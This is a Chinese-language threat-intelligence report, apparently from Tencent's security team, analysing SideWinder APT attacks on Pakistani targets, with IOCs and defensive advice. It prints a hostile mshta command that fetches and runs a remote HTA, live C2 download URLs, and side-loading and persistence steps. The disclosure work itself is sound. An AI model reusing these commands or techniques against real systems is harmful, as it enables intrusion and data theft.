# Reference for threat actor for "SideWinder, Rattlesnake"

**Title**: 响尾蛇（SideWinder）APT组织针对南亚的攻击活动披露

**Source**: https://s.tencent.com/research/report/659.html

## Content
响尾蛇（SideWinder）APT组织针对南亚的攻击活动披露 产品中心产品中心基础安全T-Sec 主机安全容器安全服务 TCSST-Sec Web应用防火墙T-Sec 云防火墙T-Sec 安全运营中心T-Sec iOA零信任安全管理系统业务安全T-Sec 天御 验证码T-Sec 天御 文本内容安全T-Sec 天御 视频内容安全T-Sec 全栈式风控引擎T-Sec 手游安全T-Sec 小程序安全T-Sec 应用合规平台数据安全T-Sec 堡垒机T-Sec 数据安全审计T-Sec 云访问安全代理T-Sec 凭据管理系统T-Sec 密钥管理系统T-Sec 云加密机T-Sec 数据安全治理中心安全服务T-Sec 安全专家服务一站式等保服务T-Sec 安全托管服务渗透测试服务应急响应服务重要时期安全保障服务安全攻防对抗服务了解全部安全产品→解决方案解决方案通用解决方案等保合规安全解决方案直播安全解决方案数据安全解决方案品牌保护解决方案高防云主机安全解决方案腾讯安心平台解决方案行业场景方案游戏安全场景方案电商安全场景方案智慧零售场景方案智慧出行场景方案安全专项解决方案勒索病毒专项解决方案重大保障安全解决方案 NEW 最新动态威胁研究合作伙伴更多更多关于我们腾讯安全介绍荣誉认证帮助中心帮助文档考试认证在线课堂证书查询联系我们产品方案咨询寻求市场合作友情链接腾讯云未登录登录可以享受精准服务推荐线上快捷下单海量资源流量立即登录威胁研究正文响尾蛇（SideWinder）APT组织针对南亚的攻击活动披露2019-02-26 10:30:18腾讯御见威胁情报中心发现一个疑似来自印度的APT攻击组织持续针对巴基斯坦等南亚国家的军事目标进行了定向攻击。
一、概述


从2017年底到2019年初，腾讯御见威胁情报中心发现一个疑似来自印度的APT攻击组织持续针对巴基斯坦等南亚国家的军事目标进行了定向攻击。腾讯御见威胁情报中心对该组织的攻击活动进行了长期的深入分析，从溯源结果来看，该组织的最早的攻击活动可以追溯到2012年。


从御见威胁情报中心的分析结果来判断，该组织的背景跟卡巴斯基在2018年第一季度报告中提到的SideWinder组织非常的相似，虽然卡巴斯基并未发布任何该组织的技术细节和报告。我们继续沿用卡巴斯基的命名，命名该组织为"响尾蛇"（SideWinder、T-APT-04）。


腾讯御见威胁情报中心曾在2018年5月份发布了该组织的技术分析报告，而此后腾讯御见威胁情报中心又多次捕捉到了该组织的攻击活动。并且从分析结果来看，该组织一直在更新他们的攻击技术，以此来躲避安全软件的拦截和查杀。





二、最新样本技术分析


1、攻击诱饵分析


本次攻击诱饵采用CVE-2017-11882漏洞进行攻击，打开后并无任何内容。


















触发漏洞后，会从远程地址http://cdn-do.net/includes/b7199e61/-1/7340/dfd9a1da/final获取hta，然后调用RunHtmlApplication，将命令行中的final.hta执行：









2、final.hta分析


final.hta内容如下：













hta脚本中第一段base64字符串解码后，发现一段c#代码及一个pe文件存储其中。将此pe文件dump出后，发现其名称为PreBotHta.dll：









PreBotHta.dll为一c# 语言编写的dll文件。Hta脚本会调用DynamicInvoke执行c#代码，最终执行PreBotHta.dll中类函数work （类名为“preBotHta”）


3、PreBotHta.dll分析


PreBotHta类中的函数如下图所示：











Work函数会检查“360”、“avast”、”avg”等杀软是否存在，若存在除上述名称以外的杀毒软件，就上报杀毒软件的名称到http://cdn-do.net/plugins/-1/7340/true/true/；接着会设置开机自启动项“credw1“；最终会将hta中的另一段base64解码解压缩得到Duser.dll，释放路径为“C:\ProgramData\drvr\srvc2”，并利用微软自带的程序credwiz.exe，将Duser.dll给执行起来：









4、Duser.dll分析


该dll所有导出函数都指向同一个地址100025f0。木马的核心功能也将从地址开始：














主要功能是先利用url http://www.microsoft.com测试网络是否连通，接着下载一个js脚本并执行此脚本，下载地址为http://cdn-list.net/KOmJg2XSthl3PRhXnB6xT6Wo967B1n5uGf7SfiBC/-1/7340/b729d30c/css













由于捕捉到样本时，该服务器已经失效，因此无法继续分析下载回的js。


三、攻击技术特点


腾讯御见威胁情报中心对SideWinder的攻击活动进行了持续的跟踪，对该组织的技术特点及变化整理如下：


攻击诱饵


该组织的攻击诱饵主要有以下两类：office文档和lnk。


1、 lnk


如某次攻击中的诱饵文件如下：






执行该lnk后，会执行命令：“%windir%\system32\mshta.exe https://msftupdate.srv-cdn.com/cdne/plds/zoxr4yr5KV.hta”








执行后，最终会使用powershell把真正的pdf给释放到%temp%\amend-ins-visit-on-abroad-15-11-2017.pdf然后打开，并且从https://msftupdate.srv-cdn.com/fin.hta下载并执行hta脚本。










2、 office文档


office文档是该组织最喜欢的攻击诱饵，捕捉到的攻击活动绝大部分都使用office文档做为攻击诱饵。并且都使用CVE-2017-11882漏洞来执行后续活动。如上述分析中的诱饵文件。也如某次攻击的诱饵文档：






触发漏洞后，会从http://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta下载最终执行的hta脚本。


木马加载技术


SideWinder组织的恶意文件的加载技术主要是使用hta脚本和白加黑的方式来进行。其中hta脚本用来做一些初始化的操作，如释放相应的恶意文件等；而释放的恶意文件采用白加黑的方式来隐藏自身和躲避拦截和查杀。但是在持续跟踪过程中，我们也发现该组织的一些技术细节也在不断的进行进化，根据该变化我们把它分为三个阶段：


1、 阶段一：~2018年10月


该阶段主要使用 hta脚本来完成所有下一阶段的初始化的工作，而在hta脚本中使用powershell脚本来进行。


如某次攻击的hta脚本：













脚本中”bnm“变量存储的一段base64字符串为一powershell脚本，p1”、“p2”变量存储的也是base64字符串，两个字符串的内容会被存入HKCU\Software\Updater\part1 和HKCU\Software\Updater\part2注册表中，这两个字符串其实就是后续的木马文件cmpbk32.dll和cmdla32.exe。


bnm变量解密出的powershell脚本内容如下所示：








主要功能是将system32目录下的msvbvm60.dll复制为ATDMEX20.dll，将system32目录下的cmdl32.exe复制到目录“%programdata%\
cmdl32\Updater\”,将上文注册表中的HKCU\Software\Updater\part1 和HKCU\Software\Updater\part2 两部分解码成cmpbk32.dll和cmdla32.exe。最终白利用cmdl32.exe加载木马文件cmpbk32.dll，并设置注册表项” Winsound“实现开机自启动。






2、 阶段二：2018年10月~2019年2月


该阶段的加载过程依然在hta脚本中进行，但是hta脚本不再使用powershell来执行下一阶段的初始化工作，直接在脚本中完成初始化的工作。如某次攻击的脚本如下：






脚本会将base64编码的压缩文件Test.zip解压，Test.zip中的文件主要有FinalBot.exe、hj.txt、hj1.txt：






接着会将hj.txt和hj1.txt中存储的cmpbk32.dll释放到C:\ProgramData\Srvstr\dat目录：






脚本会先获取杀软的名称，如果不是“360”、“ avast”，就上报杀软的名称到相应的服务器，如http://webserv-redir.net /plugins/ -1/5272/true/true/：






最后会将系统自带的“cmdl32.exe”复制到“C:\ProgramData\Srvstr\dat\”目录，创建开机自启动项“WinSrv”，并启动cmdl32.exe,然后通知服务器执行成功,最终cmdl32.exe（白）程序会加载木马文件cmpbk32.dll：






3、 阶段三：2019年2月~


该阶段的脚本类似于第二阶段的脚本，但是把第二阶段脚本中去下载回的hta脚本直接包含在了初始脚本中。但是也把第二阶段的部分功能，如监测杀软等功能放到了一个名为PreBotHta的dll中。如某次攻击的脚本如下：













脚本中的第一段base64解码后为一段c#代码以及一个c#编写的dll文件，然后调用DynamicInvoke执行c#代码：






加载的dll为PreBotHta.dll，该dll主要功能为监测安全软件、设置启动项、释放和下载下一阶段恶意文件：






无论采用哪一阶段的加载使用，最后都会使用白加黑的技术把最终的恶意文件给加载起来。


如cmdl32.exe+cmpbk32.dll组合，其中cmdl32.exe为微软自动下载连接管理的文件：






如credwiz.exe+Duser.dll组合，其中credwiz.exe为备份或还原储存的用户名和密码的文件：






RAT


最终释放的恶意文件为一个VB写的后门文件，用来收集用户信息、记录键盘和鼠标的操作等。具体的技术细节可以参考腾讯御见威胁情报中心之前关于该组织的分析报告：https://s.tencent.com/research/report/479.html
















此外，我们还在某一版本的后门中发现了一个用c#写的信息收集模块：PreBotModule.dll，该模块的主要功能是收集信息并上传至http://cdn-list.net/zqRwY5aPlgJu60xjqJIwnBPnwmqZhdNADQ50VpIy/-1/5272/1/cd24e373/res






四、攻击背景判断


1、 诱饵文件判断：


从该组织攻击的诱饵文件来看，主要是跟巴基斯坦相关，如：














而某个诱饵文件的作者信息为：






而该作者的名字Rashid Memorial恰好跟巴基斯坦军方相关：






2、 从基础设施来看


某次攻击的C&C为http://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta


根据御见安图高级威胁追溯系统的查询结果来看，跟NADRA相关：






这也正好跟上面的某个诱饵文档相符：






该诱饵下载hta的地址为：http://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta


而NADRA为巴基斯坦内政部下属的一个附属部门国家数据库和登记局成立了的国家数据库组织。






3、 VT上传信息：


从VT的上传信息来看，某些文件的上传者来自于巴基斯坦：






综上我们判断，该组织的攻击对象跟巴基斯坦军方等部门相关。


五、组织小结









六、总结


响尾蛇（SideWinder）组织是一个成熟的APT攻击组织，该组织擅长使用office漏洞、hta脚本、白加黑、VB木马等技术来实施攻击，并且攻击手法还在不断的进化中。目前该组织的攻击目标主要在巴基斯坦，但是由于地缘关系，也不排除针对中国境内的目标发起攻击，因此相关部门、单位和企业切不可掉以轻心。


七、安全建议


1、不要打开不明来源的邮件附件；除非非常清楚文档来源可靠，否则建议不要启用Office执行宏代码；


2、 及时打系统补丁和重要软件的补丁；


3、 使用杀毒软件防御可能的病毒木马攻击；


4、 使用腾讯御界高级威胁检测系统，及时发现APT攻击的蛛丝马迹。御界高级威胁检测系统，是基于腾讯安全反病毒实验室的安全能力、依托腾讯在云和端的海量数据，研发出的独特威胁情报和恶意检测模型系统。









附录


IOCs


MD5：


d2522e45c0b0d83dddd3fcc51862d48c


444438f4ce76156cec1788392f887da6


3cd725172384297732222ef9c8f74adc


c0f15436912d8a63dbb7150d95e6a4ee


c986635c40764f10bcebe280b05efe8c


d1c3fa000154dbccd6e5485a10550a29


b956496c28306c906fddf08ded1cdf65


a1ca53efda160b31ebf07d8553586264


204860ce22c81c6d9de763c09e989a20


de7f526d4f60b59bb1626770f329f984


2cb633375a5965f86360e761363d9f2f


5cd406e886bd9444adee4e8b62aa56cc


358450e19d38db77c236f45881dcebef


29325cdbde5e0cf60d277aa2d9ba4537


836419a7a4675d51d006d4cb9102af9c









URL：


hxxps://msftupdate.srv-cdn.com/cdne/plds/zoxr4yr5KV.hta


hxxps://msftupdate.srv-cdn.com/fin.hta


hxxp://www.google.com.d-dns.co/includes/686a0ea5/-1/1223/da897db0/final.hta


hxxp://www.nadra.gov.pk.d-dns.co/includes/686a0ea5/-1/1224/fa1b01fb/final.hta


hxxp://webserv-redir.net/includes/b7199e61/-1/5272/fdbfcfc1/final


hxxp://pmo.cdn-load.net/cgi/5ed0655734/-1/1078/d70cc726/file.hta


hxxp://fb-dn.net/disrt/fin.hta


hxxp://cdn-edge.net/checkout.php


hxxp://cdn-edge.net/cart.php


hxxp://cdn-edge.net/amount.php


hxxp://ap12.ms-update-server.net/checkout.php


hxxp://ap12.ms-update-server.net/cart.php


hxxp://ap12.ms-update-server.net/amount.php


hxxp://s2.cdn-edge.net/checkout.php


hxxp://s2.cdn-edge.net/cart.phpB


hxxp://s2.cdn-edge.net/amount.php


hxxp://webserv-redir.net/plugins/-1/5272/true/true/


hxxp://webserv-redir.net/plugins/-1/5272/true/true/done


hxxp://s12.cdn-apn.net/checkout.php


hxxp://s12.cdn-apn.net/cart.php


hxxp://s12.cdn-apn.net/amount.php


hxxp://cdn-do.net/plugins/-1/7340/true/true/


hxxp://cdn-list.net/KOmJg2XSthl3PRhXnB6xT6Wo967B1n5uGf7SfiBC/-1/7340/b729d30c/css






参考资料


1、 https://s.tencent.com/research/report/479.html


2、 https://medium.com/@Sebdraven/apt-sidewinder-complicates-theirs-malwares-4e15683e7e26
产品方案 产品中心威胁研究威胁通告研究报告合作伙伴合作伙伴详情其他腾讯安全介绍新闻活动在线课堂友情链接腾讯云腾讯安全公众号腾讯安全视频中心Copyright©1998-2024 Tencent. All Rights Reserved.在线咨询方案定制